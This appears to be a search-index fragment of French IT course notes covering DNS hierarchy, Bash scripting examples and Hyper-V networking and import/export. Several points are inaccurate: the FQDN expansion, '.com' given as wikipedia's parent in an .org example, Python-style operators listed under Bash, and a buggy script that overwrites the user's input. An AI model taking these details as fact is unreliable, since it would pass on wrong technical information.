place des strat\u00e9gies de filtrage (sur les adresses)  </p> <p>Pour la surveillance et le diagnostic : - Consulter les journaux d\u2019\u00e9v\u00e8nements (source DHCP Server) - Consulter le journal d\u2019audit : 1 fichier .log par jour dans le r\u00e9pertoire de la base  </p>"},{"location":"Reseaux/dns/dns/","title":"Le DNS","text":""},{"location":"Reseaux/dns/dns/#introduction","title":"Introduction","text":"<p>Le DNS, est un service permettant de r\u00e9soudre des Adresse IP en noms de domaine.  </p> <p></p> Fonctionnement du DNS"},{"location":"Reseaux/dns/dns/#nom-de-domaine","title":"Nom de domaine","text":"<p>Un nom de domaine est l'identifiant d'une \"zone\" sur internet regroupant des machines membres de cette m\u00eame zone. Cet identifiant est l'\u00e9quivalent d'une adresse postale d\u00e9finissant une zone g\u00e9ographique, c'est vulgairement une adresse internet. Cette adresse permet de trouver des sites internet sur le web, www.google.fr, fr.wikipedia.org sont des noms de domaine, associ\u00e9s \u00e0 des sites internet.  </p>"},{"location":"Reseaux/dns/dns/#composition-dun-nom-de-domaine","title":"Composition d'un nom de domaine","text":"<p>Un nom de domaine est compos\u00e9 de plusieurs parties, s\u00e9par\u00e9es les unes des autres par des points.  </p> <p>Chacune de ces parties sont compos\u00e9 par un label.  </p> <p>Exemple avec l'adresse du site internet Google </p> <p></p> <p>Nous distinguons 3 labels</p> <ul> <li>www : h\u00f4te</li> <li>repr\u00e9sente le nom de machine, d'un \"h\u00f4te\", en l'occurrence le nom du serveur web qui g\u00e8re le site</li> <li>google : nom</li> <li>cette partie repr\u00e9sente le nom de l'entreprise, Cette cha\u00eene de caract\u00e8re peut-\u00eatre, plus ou moins, n'importe quelle cha\u00eene de caract\u00e8re, votre nom, le nom de soci\u00e9t\u00e9, des mots communs, un th\u00e8me pr\u00e9cis, des chiffres...</li> <li>fr : extension</li> <li>extension du nom de domaine qui d\u00e9finit si le site est fran\u00e7ais, allemand, international, si c'est une association, une entreprise bien pr\u00e9cise, une organisation...</li> </ul> <p>Les parties 2 et 3 forment le nom de domaine de Google en France. Et les 3 labels r\u00e9unis forment l'adresse du site web.  </p> <p></p> <p>On d\u00e9duit donc que l'h\u00f4te www est une machine qui est membre de la zone google.fr.  </p>"},{"location":"Reseaux/dns/dns/#organisation-des-noms-de-domaine","title":"Organisation des noms de domaine","text":"<p>Un nom de domaine est quelque chose de tr\u00e8s structur\u00e9. Le nom de domaine a une organisation hi\u00e9rarchique, tr\u00e8s souvent repr\u00e9sent\u00e9e par une arborescence.  </p> <p>Le  nom de domaine www.google.fr n'est en r\u00e9alit\u00e9 pas un nom de domaine complet. Afin d'avoir un nom de domaine complet FQDN (Full Quality Domain Name), il faudra obligatoirement qu'il se termine par un point.  </p> <p>Pour reprendre notre exemple pr\u00e9c\u00e9dent google.fr est en r\u00e9alit\u00e9 google.fr. </p> <p>Ce point est ajout\u00e9 tacitement par le navigateur internet, voila pourquoi il est invisible pour l'utilisateur. Il sert aux machines pour envoyer les requ\u00eates DNS. Ce point final est le point de d\u00e9part du nom de domaine, il repr\u00e9sente le domaine racine \"root\".  </p> <p>le terme point de d\u00e9part est bien choisi car un nom de domaine est lu de droite \u00e0 gauche.</p> <p>Prenons l'exemple du site : fr.wikipedia.org. </p> <p>En partant de la droite :  </p> <p>Le \".\" est donc le domaine racine</p> <p>Le 2eme label \".org\", il s'agit de l'extension du nom de domaine.     L'extension du correspond \u00e0 ce qu'on appelle un nom de domaine de 1er niveau, un TLD pour \"Top Level Domain\" </p> <p>Le 3eme label \"wikipedia\" correspond au nom de l'organisme.     L'extension s'appelle un nom de domaine de 2<sup>nd</sup> niveau, un SLD pour \"Second Level Domain\" </p> <p>La partie \"fr\" est officiellement un sous-domaine du domaine wikipedia.org     Tout comme le SLD, un sous-domaine peut-\u00eatre une cha\u00eene de caract\u00e8res diverses. On peut incr\u00e9menter autant de sous-domaines que l'on veut.     ex: www.moi.fr12.monsite.com</p> <p>R\u00e9capitulatif des niveaux de TLD : </p> <p></p> <p>Au vue de cette organisation, chaque domaine est un sous-domaine du domaine racine.  </p> <ul> <li>\"fr\" est un sous-domaine de \"wikipedia\"</li> <li>\"wikipedia\" est un sous-domaine de \"com\"</li> <li>\"com\" est un sous-domaine \".\"</li> </ul> <p>Cela signifie que pour g\u00e9rer son propre nom de domaine (son propre \"SLD\"), il va falloir en obtenir la d\u00e9l\u00e9gation aupr\u00e8s du domaine racine et du domaine de 1er niveau.  </p>"},{"location":"Reseaux/dns/dns/#delegation-des-noms-de-domaine","title":"D\u00e9l\u00e9gation des noms de domaine","text":"<p>La gestion des noms de domaine est sous la responsabilit\u00e9 d'un autorit\u00e9 mondiale supr\u00eame appel\u00e9e l'ICANN (soci\u00e9t\u00e9 pour l'attribution des noms de domaine et des num\u00e9ros sur Internet).  </p> <p>Cette autorit\u00e9 a elle-m\u00eame d\u00e9l\u00e9gu\u00e9 la gestion des noms de domaine \u00e0 diff\u00e9rents organisme \u00e0 travers le monde, a commencer par le domaine racine. Il existe aujourd'hui 13 entit\u00e9s, ou groupe de serveurs DNS, r\u00e9parties \u00e0 travers le monde, qui g\u00e8rent le domaine racine \".\".  </p> <p></p> <p>Chaque entit\u00e9 partage un nom de domaine commun r\u00e9serv\u00e9 \"root-servers.net\". Seul leurs sous-domaine, represent\u00e9 par une lettre, de A \u00e0 M les diff\u00e9rencie.  </p> <p>chaque entit\u00e9 de serveurs DNS partage la m\u00eame adresse IP. La liste des serveurs racines est disponible au lien : Serveurs domaine racine </p> <p>L'int\u00e9r\u00eat de ces serveurs DNS racines c'est qu'ils contiennent des informations, qu'on appelle des enregistrements, sur les serveurs DNS qui g\u00e8rent les domaines de 1er niveau (TLD).  </p> <p>Ils sont interrog\u00e9s par les DNS du monde entier pour conna\u00eetre les noms et adresses IP des serveurs DNS TLD.  </p> <p>Toutes comme les serveurs DNS Racine, leur gestion a \u00e9t\u00e9 d\u00e9l\u00e9gu\u00e9e \u00e0 diff\u00e9rents organisme dans le monde entier (environ 800 organismes pour plus de 1500 noms de domaine de 1er niveau)  </p> <p>Un TLD peut prendre 2 formes :  </p> <ul> <li>Un code de pays, selon une norme de noms nationaux, compos\u00e9s de 2 lettres.  </li> <li>Le TLD  fran\u00e7ais \".fr\" est g\u00e9r\u00e9 par l'AFNIC  </li> <li>Un nom plus g\u00e9n\u00e9rique r\u00e9presentant un nom d'entreprise, une organisation, un groupe.  </li> </ul> <p>La liste d\u00e9taill\u00e9e des TLD existant est disponible au lien suivant: Enregistrement TLD </p> <p>Les TLD contiennent les enregistrements sur les serveurs DNS qui g\u00e8rent les noms de domaine de 2<sup>nd</sup> niveau (SLD), c'est-\u00e0-dire les noms de domaine que vous pouvez d\u00e9cider de cr\u00e9er et d'acheter \u00e0 votre guise.  </p> <p>Ils sont \u00e9galement interrog\u00e9s par les srveurs DNS du monde entier pour conna\u00eetre les noms et adresses IP des serveurs DNS SLD. Dans une logique de d\u00e9l\u00e9gation, une d\u00e9l\u00e9gation administrative vous permettra, en tant que titulaire d'un SLD de g\u00e9rer votre propre DNS. Il vous faudra un (ou plusieurs) serveur DNS, qui fera autorit\u00e9 sur votre zone dans lequel vous mettrez vos propres enregistrements. Vous pouvez soit h\u00e9berger vous-m\u00eame des serveurs DNS autoritaires, ou en confier la charge \u00e0 des soci\u00e9t\u00e9s tierces h\u00e9bergeur de domaine (OVH, Gandi...)  </p>"},{"location":"Script_bash/","title":"Script Bash","text":"<p>Un Script Shell est un fichier texte, permettant d'automatiser des op\u00e9rations. Il contient une ou plusieurs de commande shell ex\u00e9cut\u00e9es de mani\u00e8re s\u00e9quentielle.  </p> <p>Avant de partir sur l'\u00e9criture du script, une phase d'analyse est n\u00e9cessaire, celle-ci int\u00e8gre la r\u00e9daction :  </p> <ul> <li>d'un cahier des charges  </li> <li>d'un algorithme  </li> </ul> <p></p>"},{"location":"Script_bash/exemple_script/","title":"Script","text":""},{"location":"Script_bash/exemple_script/#script-filtrage","title":"Script filtrage","text":""},{"location":"Script_bash/exemple_script/#script-de-filtrage-de-fichier-par-lextension-dans-un-repertoire-specifie","title":"Script de filtrage de fichier, par l'extension dans un r\u00e9pertoire sp\u00e9cifi\u00e9.","text":"ScriptR\u00e9sultat <pre><code>#!/bin/bash  \n\nrep=$1                                              # Argument 1 \u00e0 d\u00e9finir au lancement du script  \nextension=$2                                        # Argument 2 \u00e0 d\u00e9finir au lancement du script  \n\necho \"R\u00e9pertoire de travail: $rep\"                  # Affiche la phrase et d\u00e9finit la *variable = $rep*  \necho \"Fichiers pouvant \u00eatre trait\u00e9s: \"  \nls $rep/*$extension                                 # Effectue une recherche sur le r\u00e9pertoire et sur l'extension mentionn\u00e9\n\nread -p \"Quel fichier voulez-vous traiter ?\" fic    # La commande read permet de cr\u00e9er la variable fic\nfic=$rep/$fic$extension\n\nnblign=$(wc -l &lt; $fic)\ndebut=$(head -n 2 $fic)\nfin=$(tail -n 2 $fic)\n\necho \"Caract\u00e9ristiques de $fic\"\necho \"Nombre de lignes du fichier : $nblign\"\necho \"D\u00e9but du fichier :\"\necho \"$debut\"\necho \"Fin du Fichier :\"\necho \"$fin\"\n</code></pre> <pre><code>./script.sh /etc .conf      # Les Arguments sont mentionn\u00e9s ici $1= /etc et $2= .conf\nR\u00e9pertoire de travail: /etc\nFichiers pouvant \u00eatre trait\u00e9s:  \n/etc/adduser.conf       /etc/host.conf       /etc/reportbug.conf\n[...]\nQuel fichier voulez-vous traiter ? adduser\nCaract\u00e9ristiques de /etc/adduser.conf\nNombre de lignes du fichier : 97\nD\u00e9but du fichier : \n# /etc/adduser.conf: `adduser' configuration.\n# See adduser(8) and adduser.conf(5) for full documentation.\nFin du fichier :\n#ADD_EXTRA_GROUPS=0\n</code></pre>"},{"location":"Script_bash/exemple_script/#script-de-filtrage-de-fichier-par-lextension-dans-le-repertoire-courant","title":"Script de filtrage de fichier, par l'extension dans le r\u00e9pertoire courant.","text":"ScriptR\u00e9sultat <pre><code>#!/bin/bash\n\n# R\u00e9cup\u00e9ration du r\u00e9pertoire courant\nrep=$(pwd)\nextension=$1\n\nread -p \"Quelle extension voulez-vous utilisez ?\" extension\n# D\u00e9finition de l'extension des fichiers \u00e0 traiter\nextension=$1\n\n# Affichage du r\u00e9pertoire de travail\necho \"R\u00e9pertoire de travail : $rep\"\n\n# Affichage des fichiers pouvant \u00eatre trait\u00e9s\necho \"Fichiers pouvant \u00eatre trait\u00e9s :\"\nls $rep/*$extension\n\n# Demande du nom du fichier \u00e0 traiter\nread -p \"Quel fichier voulez-vous traiter ? \" fic\nfic=$fic.$extension\n\n# Comptage du nombre de lignes\nnblign=$(wc -l &lt; $fic)\n\n# Extraction des 2 premi\u00e8res et 2 derni\u00e8res lignes\ndebut=$(head -n 2 $fic)\nfin=$(tail -n 2 $fic)\n\n# Affichage des caract\u00e9ristiques du fichier\necho \"CARACTERISTIQUES de $fic\"\necho \"Nombre de lignes du fichier : $nblign\"\necho \"D\u00e9but du fichier :\"\necho \"$debut\"\n</code></pre> <pre><code>$ ./script.sh\nQuelle extension voulez-vous utilisez ?txt\nR\u00e9pertoire de travail : /d\nFichiers pouvant \u00eatre trait\u00e9s :\n/d/test.txt  /d/test2.txt\nQuel fichier voulez-vous traiter ? test\nCARACTERISTIQUES de test.txt\nNombre de lignes du fichier : 9\nD\u00e9but du fichier :\nBonjour\nFin du fichier :\nde Scripting Bash\n</code></pre>"},{"location":"Script_bash/exemple_script/#script-verification-utilisateurs","title":"Script verification utilisateurs","text":""},{"location":"Script_bash/scripting_bash/","title":"Scripting Bash","text":""},{"location":"Script_bash/scripting_bash/#premiere-ligne-dun-script","title":"Premi\u00e9re ligne d'un script","text":"<pre><code>##################################\n##  Auteur: Mathieu\n##  Description : Script de test\n##  Date : 25092023\n##  Version : 1.0\n##################################\n</code></pre>"},{"location":"Script_bash/scripting_bash/#initinialisez-un-script-bash-premiere-ligne-imperatif","title":"Initinialisez un script Bash (premi\u00e9re ligne imp\u00e9ratif)","text":"<p><code>#!/bin/bash</code></p>"},{"location":"Script_bash/scripting_bash/#declarer-une-variable","title":"D\u00e9clarer une variable","text":"<p><code>nom_de_la_variable=\"ce que la variable contiendra\"</code></p>"},{"location":"Script_bash/scripting_bash/#type-de-variable","title":"Type de variable :","text":"<ul> <li>int  (entier)</li> <li>float (decimal)</li> <li>string (caract\u00e8re)</li> </ul>"},{"location":"Script_bash/scripting_bash/#afficher-un-texte-ou-autre","title":"Afficher un texte ou autre","text":"<p>Pour afficher quelque chose il faut faire un echo <pre><code>echo \"j'affiche le un message\"\n</code></pre> ou afficher sur plusieurs lignes :  <pre><code>echo \"je suis\nun humain\nde 18 ans \net je suis un grand\"\n</code></pre> afficher une variable <pre><code>echo \"voici ma variable voiture que j'appel comme cela $voiture\"\n</code></pre></p>"},{"location":"Script_bash/scripting_bash/#operation","title":"Op\u00e9ration","text":"<p>|Op\u00e9rateur| Nom | |+  |Addition| |\u2013  |Soustraction| |  |Multiplication|   |/  |Division| |%  |Modulo|   |* |Puissance|  |// |Division enti\u00e8re|</p>"},{"location":"Script_bash/scripting_bash/#exemple-de-script-nb-de-roue-pour-une-voiture","title":"Exemple de script nb de roue pour une voiture","text":"<pre><code>var_roue=\"1\"\nvoiture=\"$var_roue x 4\"\nvoiture=\"${voiture/1 x /}\" # Supprimer \"1 x \" de la cha\u00eene\necho \"Vous avez $voiture roues sur votre voiture\"\n</code></pre>"},{"location":"Script_bash/scripting_bash/#les-conditions","title":"Les conditions","text":"<p>Si/Alors/sinon</p> <p>\u00c2ge d\u00e9fini dans une variable</p> Script <pre><code>#!/bin/bash\necho \"Quel est votre \u00e2ge defini dans la variable ?\"\nage=\"29\"\n# V\u00e9rifier si l'\u00e2ge est sup\u00e9rieur ou \u00e9gal \u00e0 18\nif [ \"$age\" -ge 18 ]; then\n    echo \"Vous \u00eates majeur.\"\nelse\n    echo \"Vous \u00eates mineur.\"\nfi\n</code></pre> R\u00e9sultat <pre><code>$ ./script_age.sh\nQuel est votre \u00e2ge defini dans la variable ?\nVous \u00eates majeur.\n</code></pre>"},{"location":"Script_bash/scripting_bash/#creation-dune-entree-utilisateur","title":"Creation d'une entr\u00e9e utilisateur","text":"<p>D\u00e9finir une entr\u00e9e via <code>read</code></p> Script <pre><code>#!/bin/bash\n# Demander \u00e0 l'utilisateur de renseigner son \u00e2ge\necho \"Quel est votre \u00e2ge ?\"\nread age\necho \"$age\"\n</code></pre> Resultat Retour du script <pre><code>$ ./script.sh  \nquel est votre \u00e2ge ?  \n36  \n36  \n</code></pre>"},{"location":"Script_bash/scripting_bash/#combinaison-des-2-precedents-script","title":"Combinaison des 2 pr\u00e9c\u00e9dents script","text":"<p>Permet de rentrer une donn\u00e9e et d'inclure des boucles de s\u00e9lection</p> Script <pre><code>#!/bin/bash\nread -p \"Quel est votre \u00e2ge ?\" age\nif [ \"$age\" -ge 18 ]; then\n    echo \"Vous \u00eates majeur.\"\nelse\n    echo \"Vous \u00eates mineur.\"\nfi\n</code></pre> R\u00e9sultat <pre><code>$ ./script_age.sh\nQuel est votre \u00e2ge ?36\nVous \u00eates majeur.\n</code></pre> R\u00e9sultat 2 <pre><code>$ ./script_age.sh\nQuel est votre \u00e2ge ?16\nVous \u00eates mineur.\n</code></pre>"},{"location":"Script_bash/scripting_bash/#faire-un-saut-de-ligne","title":"Faire un saut de ligne","text":"<p><code>\\n</code></p> Exemple 1Exemple 2Exemple 3Exemple 4 <pre><code>echo -e \"Ceci est une ligne.\\nCeci est une autre ligne.\"\n</code></pre> R\u00e9sultat Exemple 1 <pre><code>Ceci est une ligne  \nCeci est une autre ligne  \n</code></pre> <pre><code>echo -e \"\\n\"\n</code></pre> <pre><code>echo \"\"\n</code></pre> <pre><code>echo\n</code></pre>"},{"location":"Script_bash/scripting_bash/#les-boucles-while","title":"Les boucles while","text":"<pre><code>#!/bin/bash\n\ncompteur=1\n\nwhile [ $compteur -le 5 ]\ndo\n    echo \"Compteur : $compteur\"\n    compteur=$((compteur + 1))\ndone\n\necho \"Boucle termin\u00e9e\"\n</code></pre>"},{"location":"Script_bash/scripting_bash/#les-cases","title":"Les cases","text":"<pre><code>#!/bin/bash\n\nfruit=\"pomme\"\n\ncase $fruit in\n    \"pomme\")\n        echo \"C'est une pomme\" ;;\n    \"banane\")\n        echo \"C'est une banane\" ;;\n    \"orange\")\n        echo \"C'est une orange\" ;;\n    *)\n        echo \"Je ne sais pas quel fruit c'est.\" ;;\nesac\n</code></pre>"},{"location":"Virtualisation/HyperV/","title":"HyperV","text":""},{"location":"Virtualisation/HyperV/#prerequis-et-installation","title":"Pr\u00e9requis et Installation","text":"<p>l'installation d'une solution de virtualisation de serveur n\u00e9cessite certains pr\u00e9requis mat\u00e9riels en effet comme toute solution de virtualisation hyper V n\u00e9cessite que l'h\u00f4te de virtualisation poss\u00e8de les pr\u00e9requis au niveau du CPU. nous avons d\u00e9j\u00e0 vu ses pr\u00e9requis qui sont l'intel VT-x avec un num\u00e9ro de version en fonction de la g\u00e9n\u00e9ration de microprocesseurs ou AMD-v. Hyper V fonctionne \u00e9galement uniquement \u00e0 partir de Microsoft Windows, il faut au minimum utiliser la version 2008 de la distribution serveur de Windows. Hyper V peut \u00e9galement fonctionner sur la solution cliente de Windows \u00e0 partir de Windows 8 pro en version 64 bits. Hyper V existe sur 2 solutions bien distinctes la version serveur autonome, qui dispose de la console de gestion hyper V et d'une console PowerShell. La gestion des machines virtuelles peut se faire soit avec le mod\u00e8le hyper V pour PowerShell soit avec un second syst\u00e8me Windows Server ou un syst\u00e8me client Windows 10, sur lequel sont install\u00e9s le module de gestion hyper V \u00e0 partir de l'installation des outils RSAT. Sur les versions Windows Server il y a un r\u00f4le \u00e0 installer, ce r\u00f4le s'appelle hyper V il s'installe \u00e0 partir du gestionnaire de serveur la console de gestion s'installe \u00e9galement en m\u00eame temps que le r\u00f4le .  </p>"},{"location":"Virtualisation/HyperV/#mise-en-oeuvre","title":"Mise en oeuvre","text":"<p>Comme toutes solution de virtualisation hyper V permet de cr\u00e9er et de g\u00e9rer des machines virtuelles ces machines virtuelles vont b\u00e9n\u00e9ficier des ressources mises \u00e0 disposition par l'h\u00f4te, la gestion de ces machines virtuelles se fera soit par la console MMC, soit par l'outil en ligne de commande powershell avec le module hyperV. Dans la partie console l'interaction avec le syst\u00e8me h\u00f4te va se faire avec la combinaison touche ++contr\u00f4le+alt++ cette combinaison de touche va nous permettre de r\u00e9cup\u00e9rer les entr\u00e9es clavier et \u00e9galement les actions faites \u00e0 la souris. Les VM vont \u00eatre stock\u00e9es dans des fen\u00eatres ind\u00e9pendantes, ces fen\u00eatres vont pouvoir \u00eatre r\u00e9duites et d\u00e9plac\u00e9es avec les touches d'action. On peut utiliser \u00e9galement des m\u00e9dias amovibles comme les cl\u00e9s USB et disque dur externe , ces p\u00e9riph\u00e9riques pourront \u00eatre reli\u00e9s directement aux machines virtuelles. Dans les diff\u00e9rentes fonctionnalit\u00e9s , chaque VM sera donc affich\u00e9 dans une console ind\u00e9pendante. Chaque mat\u00e9riel sera repr\u00e9sent\u00e9 comme le bios , la m\u00e9moire , les disques durs , les lecteurs DVD. Il est possible de faire des instantan\u00e9 de chaque machine virtuelle il est conseill\u00e9 de faire ces instantan\u00e9s lorsque la machine est \u00e9teinte sinon dans le cas d'un instantan\u00e9 sur une machine allum\u00e9e la m\u00e9moire vive sera stock\u00e9e et augmentera la taille de l'instantan\u00e9. Il est \u00e9galement possible d'importer et d'exporter les machines virtuelles d'une solution hyper V vers une autre solution hyper V, attention cela n\u00e9cessite la version 2 d'Hyper-V (Depuis une version 1 vers une version 2 ne sera pas possible). Dans les sp\u00e9cificit\u00e9s d'hyper V on va retrouver un outil orient\u00e9 serveur, cet outil vas proposer de nombreuses fonctionnalit\u00e9s donc de la haut disponibilit\u00e9. Cet outil va n\u00e9cessit\u00e9 n\u00e9anmoins d'avoir une certaine habitude \u00e0 l'utilisation. Il y a \u00e9galement les fichiers qui permettent de stocker le param\u00e9trage des machines virtuelles ainsi que les fichiers de disque dur, qui vont devoir \u00eatre d\u00e9plac\u00e9s \u00e0 la main ou modifier manuellement pour interagir avec la configuration des machines virtuelles. La combinaison de touche , Ctrl+Alt+Del, qui est n\u00e9cessaire pour ouvrir une session sur un syst\u00e8me Server, va se faire avec hyper V avec la combinaison de touches , Ctrl+Alt+End. En r\u00e9sum\u00e9, l'utilisation d'hyper V reste facile mais n\u00e9cessite un temps d'adaptation par rapport \u00e0 une solution de virtualisation de type poste de travail.  </p>"},{"location":"Virtualisation/HyperV/#parametrages-reseau","title":"Param\u00e9trages R\u00e9seau","text":"<p>Comme toute solution de virtualisation l'acc\u00e8s au r\u00e9seau par les machines virtuelles va \u00eatre d\u00e9termin\u00e9 par le type de profil auquel la machine virtuelle va \u00eatre reli\u00e9e. En effet hyper V permet d'utiliser 3 types de r\u00e9seaux selon la configuration souhait\u00e9e. Le mode priv\u00e9 va permettre aux machines virtuelles de communiquer uniquement entre la machine h\u00e9bergeant la solution de virtualisation, donc l'hote, et les machines virtuelles les machines virtuelles pourront communiquer entre elles et \u00e9galement b\u00e9n\u00e9ficier des services install\u00e9s sur l'hote de virtualisation. Cette hote de virtualisation \u00e9tant un syst\u00e8me d'exploitation Windows Server les machines pourront b\u00e9n\u00e9ficier de services r\u00e9seaux comme le service DNS ou le service DHCP. Le mode suivant est le mode interne uniquement dans ce cas l\u00e0 les machines virtuelles ne pourront communiquer qu entre elles. Le mode externe qui va \u00eatre l'\u00e9quivalent des configurations type bridge que l'on retrouve sur d'autres solutions de virtualisation vont permettre aux machines virtuelles d'avoir les m\u00eames services que la machine hote, elles vont pouvoir communiquer sur le r\u00e9seau physique b\u00e9n\u00e9ficier des services du r\u00e9seau physique comme le serveur DHCP le serveur DNS ou la fonction de routage pour acc\u00e9der \u00e0 internet et \u00e0 d'autres r\u00e9seaux, Attention n\u00e9anmoins avec cette fonctionnalit\u00e9 la machine virtuelle se trouve pleinement expos\u00e9e au r\u00e9seau. Le dernier profil va \u00eatre le r\u00e9seau externe d\u00e9di\u00e9 cette fonction l\u00e0 va \u00eatre propre \u00e0 hyper-V on ne retrouve pas d'\u00e9quivalent sur d'autres solutions de virtualisation dans cette m\u00e9thode de fonctionnement , la carte r\u00e9seau externe est associ\u00e9e de mani\u00e8re exclusive \u00e0 une carte physique de l'hote. Ce qui a pour effet de d\u00e9dier une carte r\u00e9seau physique \u00e0 une machine virtuelle. Donc la machine virtuelle communique int\u00e9gralement avec cette carte r\u00e9seau, mais la machine hote n'a plus l'acc\u00e8s \u00e0 cette carte reseau.Cette fonctionnalit\u00e9 l\u00e0 peut \u00eatre int\u00e9ressante lorsque la machine virtuelle h\u00e9berge des services tr\u00e8s sp\u00e9cifiques comme par exemple du stockage de type SaaS du protocole de type ISCSI, c'est services qui vont \u00eatre dirig\u00e9s exclusivement sur un r\u00e9seau de stockage par exemple. En r\u00e9sum\u00e9 , la gestion de r\u00e9seau se fait en fonction du besoin de la machine virtuelle. Pour assigner un profil r\u00e9seau \u00e0 une machine virtuelle . Il est possible de le faire directement depuis la console de gestion . En effet , on va pouvoir cr\u00e9er un r\u00e9seau virtuel par la fonction nouveau r\u00e9seau virtuel. Les cons\u00e9quences de la cr\u00e9ation d'un nouveau r\u00e9seau virtuel, cela va cr\u00e9er un switch virtuel, ce switch Virtuel, on va ensuite lui assigner un r\u00f4le. On peut lui assigner le r\u00f4le de r\u00e9seau externe, de r\u00e9seau interne ou de r\u00e9seau priv\u00e9. Le r\u00e9seau externe permettra d'acc\u00e9der au r\u00e9seau physique connecter \u00e0 l'hote, Le r\u00e9seau interne va uniquement connecter l'h\u00f4te et les machines virtuelles et Le r\u00e9seau priv\u00e9 comme on la vue pr\u00e9c\u00e9demment ne fera que interconnecter les machines virtuelles connect\u00e9es \u00e0 ce commutateur. Il est \u00e9galement possible de ne pas d\u00e9finir de profil r\u00e9seau dans ce cas l\u00e0 , la machine virtuelle sera totalement isol\u00e9e. La cr\u00e9ation des machines virtuelles va se faire par l'option \"assistant au nouveau ordinateur virtuel\".Le choix a effectu\u00e9 va \u00eatre de d\u00e9signer une machine de g\u00e9n\u00e9ration 1 ou de g\u00e9n\u00e9ration 2 . Ce choix est tr\u00e8s important car il va permettre ou pas d'utiliser des syst\u00e8mes d'exploitation r\u00e9cents. En effet, les machines virtuelles de g\u00e9n\u00e9ration une ne permettent pas d'utiliser la fonction de d\u00e9marrage UEFI. Fonction de d\u00e9marrage que l'on retrouve sur tous les syst\u00e8mes d'exploitation depuis Windows 8 et \u00e9galement sur les syst\u00e8mes d'exploitation open-source. Les machines de g\u00e9n\u00e9ration 2 sont des machines qui vont avoir des fonctionnalit\u00e9s avanc\u00e9es et ce sont \u00e9galement les machines de g\u00e9n\u00e9ration 2 qui vont pouvoir \u00eatre export\u00e9es d'un hyperviseur hyper-V vers un autre hyperviseur hyper-V voire une autre solution de virtualisation de serveurs. Les pr\u00e9requis sont les m\u00eames que sur une solution de virtualisation du poste de travail, c'est \u00e0 dire qu'il va falloir g\u00e9rer l'emplacement de stockage ainsi que les diff\u00e9rents param\u00e8tres mat\u00e9riels concernant l'attribution du CPU de la RAM des \u00e9l\u00e9ments de stockage ainsi que de l'image ISO qui va permettre de faire l'installation du syst\u00e8me.  </p>"},{"location":"Virtualisation/HyperV/#gestion-de-lhyperviseur","title":"Gestion de l'hyperviseur","text":"<p>La console Hyper V qui est int\u00e9gr\u00e9 sur les syst\u00e8mes serveurs disposant du r\u00f4le hyper V ou du syst\u00e8me client disposant des outils d'administration hyper V va permettre de g\u00e9rer un ou plusieurs serveurs disposant du r\u00f4le hyper-V. On retrouve dans la partie gauche ici la liste des serveurs qui sont actuellement disponibles sur la console de gestion ces serveurs peuvent \u00eatre des serveurs locaux ou des serveurs distants. Ensuite pour chaque serveur nous avons ici la liste et l'\u00e9tat des machines virtuelles h\u00e9berger sur ces serveurs. Dans la partie du dessous nous avons l'information sur la machine virtuelle s\u00e9lectionn\u00e9e nous allosn retrouver l'historique des instantan\u00e9s si des instantan\u00e9s ont \u00e9t\u00e9 faits sur cette machine virtuelle \u00e9galement la date de cr\u00e9ation de la machine virtuelle ainsi que les diff\u00e9rents \u00e9l\u00e9ments mat\u00e9riels de la machine virtuelle. Sur la partie de droite nous allons avoir la gestion du serveur qui va nous permettre de cr\u00e9er une nouvelle machine virtuelle de cr\u00e9er un nouveau commutateur virtuel afin de cr\u00e9er un nouveau profil r\u00e9seau puis de les mettre \u00e0 disposition de l\u00e0 ou des machines virtuelles disponibles sur ce serveur. Il est \u00e9galement possible d'importer des machines virtuelles avec la fonction importe disque il est aussi possible d'arr\u00eater le r\u00f4le hyper V sur ce serveur. Dans la partie basse nous avons toutes les commandes pour la gestion de la machine virtuelle la fonction connect va nous permettre d'ouvrir une console de gestion unique pour cette machine virtuelle les autres fonctionnalit\u00e9s vous concerner l'exportation le d\u00e9placement ou la modification des diff\u00e9rents param\u00e8tres de la machine virtuelle comme la capacit\u00e9 en m\u00e9moire ou le stockage. Il est \u00e9galement possible de supprimer cette machine virtuelle ou de l'exporter pour pouvoir ensuite la r\u00e9importer sur un autre hyperviseur.  </p>"},{"location":"Virtualisation/HyperV/#console-dordinateur-visuel","title":"Console d'ordinateur visuel","text":"<p>Nous venons de voir la console permettant de g\u00e9rer le r\u00f4le hyper-V. Cette console va \u00eatre dupliqu\u00e9e et rendue unique pour la gestion de chaque machine virtuelle. En effet toutes les machines virtuelles h\u00e9berg\u00e9es sur un serveur hyper-V vont b\u00e9n\u00e9ficier d'une console graphique de gestion qui va \u00eatre unique. Cette console va nous permettre de modifier ici le comportement de base de l'information virtuelle. Nous allons avoir acc\u00e8s \u00e0 des param\u00e8tres. Ces param\u00e8tres vont \u00eatre notamment les commandes d'allumage et d'extinction. La modification des param\u00e8tres de la machine virtuelle ainsi que la modification du comportement, notamment des touches de raccourci ou des touches d'action. Le bandeau inf\u00e9rieur va nous permettre d'avoir les fonctions dites raccourcies, Ces fonctions sont les fonctions les plus utilis\u00e9es dans la gestion d'une machine virtuelle. On y retrouve la possibilit\u00e9 d'envoyer une combinaison de touches Ctrl+Alt+Del il y a \u00e9galement la gestion des instantan\u00e9s avec la prise d'un instantan\u00e9 o\u00f9 la consultation de l'historique des instantan\u00e9s. Il est possible avec la fl\u00e8che retour arri\u00e8re de remettre la machine \u00e0 son \u00c9tat instantan\u00e9 le plus proche. Il est \u00e9galement possible de g\u00e9rer l'allumage et l'extinction des machines \u00e0 partir de ce bandeau. La partie sup\u00e9rieure droite concerne la fermeture de la console, Attention, le fait de fermer la console d'une machine virtuelle, ne met pas en pause ni n'\u00e9teint cette machine virtuelle. En effet , le process va continuer \u00e0 fonctionner sur le serveur hyper V simplement nous n'aurons plus de console de gestion de cette machine.  </p>"},{"location":"Virtualisation/HyperV/#exportation-et-importation","title":"Exportation et Importation","text":"<p>Il est possible avec hyper V d'exporter puis de r\u00e9importer des machines virtuelles. Ces manipulations n\u00e9cessitent de retravailler les fichiers qui permettent de stocker cette machine virtuelle. Pour pouvoir \u00eatre dupliqu\u00e9 ou d\u00e9plac\u00e9 il faut d'abord passer par la phase d'exportation, l'exportation est disponible depuis la console de gestion des machines virtuelles du serveur hyper-V. Pour pouvoir importer une machine virtuelle , on doit disposer de la totalit\u00e9 des fichiers de configuration de cette machine virtuelle. L'importation peut \u00e9galement se faire sans dupliquer la totalit\u00e9 des fichiers dans ce cas l\u00e0 on ne pourra faire qu'une seule et unique importation de la VM. En effet, dans l'importation sans duplication de fichiers on va simplement d\u00e9placer la machine virtuelle d'un hyperviseur vers un autre , mais cette machine ne sera plus disponible sur l'hyperviseur d'origine. La 2eme option \"dupliquer tous les fichiers\" va copier la machine virtuelle d'un 